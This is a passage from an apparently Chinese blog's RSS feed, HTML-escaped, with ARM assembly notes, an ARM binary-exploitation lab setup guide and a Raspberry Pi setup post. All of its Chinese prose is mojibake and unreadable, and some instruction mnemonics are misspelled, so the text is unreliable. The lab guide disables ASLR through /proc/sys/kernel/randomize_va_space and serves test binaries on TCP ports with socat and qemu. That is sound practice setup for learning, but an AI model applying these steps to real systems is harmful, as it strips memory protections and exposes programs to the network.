&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">.section .text
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.global _start
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_start:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov r0, &lt;span class="c1">#256 /* 1 ror 24 = 256, so it&amp;#39;s valid */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add r0, &lt;span class="c1">#255 /* 255 ror 0 = 255, valid. r0 = 256 + 255 = 511 */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ldr r1, &lt;span class="o">=&lt;/span>&lt;span class="m">511&lt;/span> /* load &lt;span class="m">511&lt;/span> from the literal pool using LDR */
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> bkpt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è®¡ç®—ç«‹å³æ•°çš„æœ‰æ•ˆå€¼è„šæœ¬ï¼šhttps://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">azeria@labs:~$ python rotator.py
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter the value you want to check: &lt;span class="m">511&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Sorry, &lt;span class="m">511&lt;/span> cannot be used as an immediate number and has to be split.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">azeria@labs:~$ python rotator.py
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter the value you want to check: &lt;span class="m">256&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The number &lt;span class="m">256&lt;/span> can be used as a valid immediate number.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">1&lt;/span> ror &lt;span class="m">24&lt;/span> --&amp;gt; &lt;span class="m">256&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¸‹é¢çš„éƒ¨åˆ†æŒ‡ä»¤ç”¨åˆ°åœ¨è¯¦ç»†æŸ¥ï¼Œè®°çš„è¯è„‘å£³ç—›&lt;/p>
&lt;h3 id="è·³è½¬æŒ‡ä»¤">è·³è½¬æŒ‡ä»¤&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>&lt;code>B&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>BL&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>BX&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>BXL&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="å­˜å‚¨å™¨æ“ä½œæŒ‡ä»¤">å­˜å‚¨å™¨æ“ä½œæŒ‡ä»¤&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>&lt;code>LDM&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>STM&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>PUSH&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>POP&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SWP&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="æ•°æ®å¤„ç†">æ•°æ®å¤„ç†&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>&lt;code>MOV&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>MVN&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>ADD&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>ADC&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SUB&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>RSB&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SBC&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>RSC&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>MUL&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>MLS&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>MLA&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>UMULL&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>UMLAL&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SMUULL&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SMLAL&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SMLAD&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SMLSD&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>SDIV&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>UDIV&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>ASR&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>AND&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>ORR&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>EOR&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>BIC&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>LSL&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>LSR&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>RRX&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>ROR&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>CMP&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>CMN&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>TSL&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>TEQ&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="å…¶ä»–æŒ‡ä»¤">å…¶ä»–æŒ‡ä»¤&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>&lt;code>SWI&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>NOP&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>MRS&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>MSR&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h3 id="heading">&lt;/h3>
&lt;/li>
&lt;/ul></description></item><item><title>ARM-PWNä»å…¥é—¨åˆ°æ”¾å¼ƒ0x00-ç¯å¢ƒå‡†å¤‡</title><link>https://ykiko.top/p/arm-pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%830x00-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/</link><pubDate>Sat, 03 Aug 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/arm-pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%830x00-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/</guid><description>&lt;h1 id="arm-pwnä»å…¥é—¨åˆ°æ”¾å¼ƒ0x00-ç¯å¢ƒå‡†å¤‡">ARM-PWNä»å…¥é—¨åˆ°æ”¾å¼ƒ0x00-ç¯å¢ƒå‡†å¤‡&lt;/h1>
&lt;h3 id="0x00-å‰è¨€">0x00 å‰è¨€&lt;/h3>
&lt;p>å­¦PWNä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œx86/x86_64 ä¸‹ç®—æ˜¯å…¥äº†ä¸ªé—¨ï¼Œå¹³æ—¶æ¥è§¦ARMæ¯”è¾ƒå¤šï¼Œæ­£å¥½ä»¥ARMæ¶æ„ä¸‹å†æ›´åŠ æ·±å…¥çš„å­¦ä¹ PWNã€‚&lt;/p>
&lt;p>ä¼šç”¨çš„å·¥å…·ã€ç¯å¢ƒï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>åœ¨Ubuntu 18.04/WSL2&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Docker for wsl2&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ ‘è“æ´¾3B+&lt;/p>
&lt;/li>
&lt;li>
&lt;p>qemu&lt;/p>
&lt;/li>
&lt;li>
&lt;p>unicorn&lt;/p>
&lt;/li>
&lt;li>
&lt;p>IDA&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Radare2&lt;/p>
&lt;/li>
&lt;li>
&lt;p>GDB+gef+pwndbg+peda&lt;/p>
&lt;/li>
&lt;li>
&lt;p>pwntools&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-ç¯å¢ƒå®‰è£…">0x01 ç¯å¢ƒå®‰è£…&lt;/h3>
&lt;p>è¿™é‡Œé€‰ç”¨çš„æœ‰ä¸¤ç§ç¯å¢ƒ&lt;/p>
&lt;ol>
&lt;li>
&lt;p>ARMè®¾å¤‡ æ ‘è“æ´¾&lt;/p>
&lt;p>ä¹‹å‰618ä¹°äº†æ ‘è“æ´¾ï¼Œæ´¾ä¸Šç”¨åœºäº†ã€‚&lt;/p>
&lt;p>æŠŠPIçš„å®˜æ–¹ç³»ç»Ÿæ¢æˆäº†Ubuntu 18.04ã€‚&lt;/p>
&lt;p>å®‰è£…äº†GCC ã€gdbã€gefï¼ˆç»æµ‹è¯•åªæœ‰gefèƒ½ç”¨ï¼‰ï¼Œå…¶ä»–ä¹Ÿæ²¡ä»€ä¹ˆéœ€è¦è£…çš„ã€‚&lt;/p>
&lt;p>å…³é—­åœ°å€éšæœºåŒ–&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo cat /proc/sys/kernel/randomize_va_space &lt;span class="c1"># çŠ¶æ€æŸ¥çœ‹&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">2&lt;/span> &lt;span class="c1"># å¼€å¯ä¸­&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo &lt;span class="nb">echo&lt;/span> &lt;span class="m">0&lt;/span> &amp;gt; /proc/sys/kernel/randomize_va_space
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bash: /proc/sys/kernel/randomize_va_space: Permission denied
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">su
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="m">0&lt;/span> &amp;gt; /proc/sys/kernel/randomize_va_space
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat /proc/sys/kernel/randomize_va_space
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> &lt;span class="c1">#è¿™å°±OK&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>QEMU æ¨¡æ‹Ÿ (WSL2)&lt;/p>
&lt;p>å®‰è£…&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#é˜²æ­¢åˆå‡ºä»€ä¹ˆä¹±ä¸ƒå…«ç³Ÿçš„é”™è¯¯å’Œéœ€æ±‚ï¼Œå°½é‡éƒ½è£…ä¸Š&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apt install gdb gdb-multiarch &lt;span class="c1">##&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apt install qemu &lt;span class="c1">##&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu &lt;span class="c1">##gcc arm ä¾èµ–åº“å®‰è£…&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;h3 id="0x02-å¯åŠ¨å’Œè°ƒè¯•">0x02 å¯åŠ¨å’Œè°ƒè¯•&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>æ ‘è“æ´¾&lt;/p>
&lt;p>ç›´æ¥è¿è¡Œ&lt;/p>
&lt;p>è¿›è¡Œsocatç»‘å®šç«¯å£ å°±OK&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">socat tcp-listen:6666,fork exec:./binfile
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>QEMU&lt;/p>
&lt;ul>
&lt;li>32bit&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æœ¬åœ°GDBè°ƒè¯•&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">qemu-arm -g &lt;span class="m">1234&lt;/span> -L /usr/arm-linux-gnueabi ./binfile
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gdb-multiarch
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">target remote localhost:1234
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ç»‘å®šè¿è¡Œåˆ°æŒ‡å®šç«¯å£ è¿œç¨‹è°ƒè¯•&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">socat tcp-l:10002,fork exec:&lt;span class="s2">&amp;#34;qemu-arm -L /usr/arm-linux-gnueabi ./binfile&amp;#34;&lt;/span>,reuseaddr &lt;span class="p">&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># + -g æ–¹ä¾¿è°ƒè¯• &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">socat tcp-l:10002,fork exec:&lt;span class="s2">&amp;#34;qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./binfile&amp;#34;&lt;/span>,reuseaddr &lt;span class="p">&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>64bit&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æœ¬åœ°è°ƒè¯• -g ç­‰å¾…GDBè°ƒè¯•&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">qemu-aarch64 -g &lt;span class="m">1111&lt;/span> -L /usr/aarch64-linux-gnu ./file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">socat tcp-l:10002,fork exec:&lt;span class="s2">&amp;#34;qemu-aarch64 -L /usr/aarch64-linux-gnu ./binfile&amp;#34;&lt;/span>,reuseaddr &lt;span class="p">&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">socat tcp-l:10002,fork exec:&lt;span class="s2">&amp;#34;qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./binfile&amp;#34;&lt;/span>,reuseaddr &lt;span class="p">&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ol>
&lt;h3 id="0x03-è°ƒè¯•è¿‡ç¨‹">0x03 è°ƒè¯•è¿‡ç¨‹&lt;/h3>
&lt;p>åœ¨æ ‘è“æ´¾ç›´æ¥gdbè°ƒè¯•å°±è¡Œã€‚çœç•¥ã€‚ã€‚ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190804221031.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>img&lt;/p>
&lt;p>ä½¿ç”¨qemu+gdb-multiarch+æ’ä»¶è¿›è¡Œè°ƒè¯•æ­¥éª¤&lt;/p>
&lt;p>&lt;code>qemu-aarch64 -g 10002 -L /usr/aarch64-linux-gnu ./baby_arm&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">gdb-multiarch ./baby_arm -q
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">target remote:10002
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190804225625.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="0x04-é¢˜ç›®æ­å»º">0x04 é¢˜ç›®æ­å»º&lt;/h3>
&lt;p>åŸºäº&lt;a class="link" href="https://github.com/Eadom/ctf_xinetd" target="_blank" rel="noopener"
>ctf_xinetd&lt;/a>é¡¹ç›®è‡ªå·±æ”¹äº†ä¸€ä¸ª&lt;/p>
&lt;p>åœ°å€ï¼š&lt;a class="link" href="https://github.com/Vorblock/CTF_arm_xinetd" target="_blank" rel="noopener"
>CTF_ARM_xinetd&lt;/a>&lt;/p>
&lt;h3 id="0x05-å‚è€ƒé“¾æ¥">0x05 å‚è€ƒé“¾æ¥&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="https://xz.aliyun.com/t/3154" target="_blank" rel="noopener"
>https://xz.aliyun.com/t/3154&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/Eadom/ctf_xinetd" target="_blank" rel="noopener"
>https://github.com/Eadom/ctf_xinetd&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/bkerler/exploit_me" target="_blank" rel="noopener"
>https://github.com/bkerler/exploit_me&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>Raspberry_Pi_3B+_0å®‰è£…ä½¿ç”¨</title><link>https://ykiko.top/p/raspberry_pi_3b-_0%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</link><pubDate>Sun, 23 Jun 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/raspberry_pi_3b-_0%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</guid><description>&lt;h1 id="raspberry_pi_3b_0å®‰è£…ä½¿ç”¨">Raspberry_Pi_3B+_0å®‰è£…ä½¿ç”¨&lt;/h1>
&lt;h2 id="raspberry-pi-3b-0å®‰è£…ä½¿ç”¨">Raspberry Pi 3B+ 0å®‰è£…ä½¿ç”¨&lt;/h2>
&lt;h3 id="0x00-è´­ä¹°">0x00 è´­ä¹°&lt;/h3>
&lt;p>ç»ˆäºä¸‹æ‰‹ä¹°äº†ã€‚æ‰“ç®—ç”¨æ¥å­¦ä¹ ARMã€ä»¥åŠä¸€äº›ç¡¬ä»¶çš„çŸ¥è¯†ã€‚&lt;/p>
&lt;ul>
&lt;li>
&lt;p>3B+ è£¸æœº&lt;/p>
&lt;/li>
&lt;li>
&lt;p>32G SD card&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æ•£çƒ­ç‰‡&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¿æŠ¤å£³&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623005746.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="0x01-å®‰è£…ç³»ç»Ÿ">0x01 å®‰è£…ç³»ç»Ÿ&lt;/h3>
&lt;p>é¦–å…ˆä¸‹è½½ç³»ç»Ÿé•œåƒã€‚&lt;/p>
&lt;p>å®˜ç½‘æœ‰æŒºå¤šç³»ç»Ÿå¯ä»¥é€‰æ‹©ï¼Œè¿™é‡Œé€‰æ‹©äº†å®‰è£…&lt;a class="link" href="https://www.raspberrypi.org/downloads/" target="_blank" rel="noopener"
>Raspbian&lt;/a> desktopæœ€æ–°ç‰ˆ&lt;/p>
&lt;p>ä¹‹åæ‰“ç®—è£…Liteç‰ˆï¼Œæ‰‹ä¸Šæ²¡æœ‰å¤šä½™çš„æ˜¾ç¤ºå™¨ã€‚è€Œä¸”æ¡Œé¢ç‰ˆå ç”¨å¾ˆé«˜ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190622221745.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>è¿…é›·ï¼Œ3åˆ†é’Ÿæå®šã€‚&lt;/p>
&lt;p>å…¶æ¬¡å¼€å§‹å‘SDå¡ä¸­å†™é•œåƒã€‚&lt;/p>
&lt;p>ä¹°çš„32Gé—ªè¿ªçš„é«˜é€Ÿå¡ï¼Œç°åœ¨32Géƒ½ç™½èœä»·äº†ï¼Œæƒ³æƒ³å‡ å¹´å‰16Gçš„æ­»è´µã€‚&lt;/p>
&lt;p>å®˜æ–¹æ•™ç¨‹ç”¨çš„æ˜¯&lt;a class="link" href="https://etcher.io/" target="_blank" rel="noopener"
>Etcher&lt;/a> ï¼Œä¹Ÿå¯ä»¥ç”¨&lt;a class="link" href="https://sourceforge.net/projects/win32diskimager/" target="_blank" rel="noopener"
>Win32DiskImager&lt;/a>ã€‚è¿™é‡Œçœäº‹è¿˜æ˜¯ç”¨Etcherã€‚&lt;/p>
&lt;p>æ­¥éª¤&lt;/p>
&lt;ol>
&lt;li>
&lt;p>ä¸‹è½½&lt;a class="link" href="https://etcher.io/" target="_blank" rel="noopener"
>etcher.io&lt;/a>å®‰è£…åŒ…å®‰è£…Etcher](&lt;a class="link" href="https://etcher.io/" target="_blank" rel="noopener"
>https://etcher.io/&lt;/a>)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è¿è¡ŒEtcher,é€‰æ‹©é•œåƒå’Œsdå¡&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190622222523.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ol>
&lt;li>Flashä¸€é”®æå®šã€‚&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190622223043.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="0x02-é…ç½®">0x02 é…ç½®&lt;/h3>
&lt;p>ç³»ç»Ÿå®‰è£…å®Œï¼Œå¼€å§‹è¿›è¡Œé…ç½®ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623003205.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>å…ˆè¿ä¸Šæ˜¾ç¤ºå™¨çœ‹çœ‹&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623003758.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>ç„¶è€Œå¹³æ—¶æ˜¾ç¤ºå™¨è¿˜æ˜¯è¦è¿ç¬”è®°æœ¬ï¼Œè€Œä¸”è¿™åˆ†è¾¨ç‡å¥½ç³Šã€‚æ‰€ä»¥è¿˜æ˜¯é…sshå’ŒVNCè¿æ¥ä½¿ç”¨å§ã€‚&lt;/p>
&lt;ul>
&lt;li>ä¿®æ”¹æº&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl"># ç¼–è¾‘ `/etc/apt/sources.list` æ–‡ä»¶ï¼Œåˆ é™¤åŸæ–‡ä»¶æ‰€æœ‰å†…å®¹ï¼Œç”¨ä»¥ä¸‹å†…å®¹å–ä»£ï¼š
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main non-free contrib
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main non-free contrib
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># ç¼–è¾‘ `/etc/apt/sources.list.d/raspi.list` æ–‡ä»¶ï¼Œåˆ é™¤åŸæ–‡ä»¶æ‰€æœ‰å†…å®¹ï¼Œç”¨ä»¥ä¸‹å†…å®¹å–ä»£ï¼š
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">deb http://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ stretch main
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>sudo apt update&lt;/code>&lt;/p>
&lt;ul>
&lt;li>æ‹“å±•SDå¡&lt;/li>
&lt;/ul>
&lt;p>&lt;code>sudo raspi-config&lt;/code> -&amp;gt; Advanced Opt -&amp;gt; A1 Expand Filesystem&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623140154.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>ssh é…ç½®&lt;/li>
&lt;/ul>
&lt;p>æœ€æ–°ç‰ˆç³»ç»Ÿç›´æ¥æƒ³è¦çš„æ¥å£æ‰“å¼€å°±OK&lt;/p>
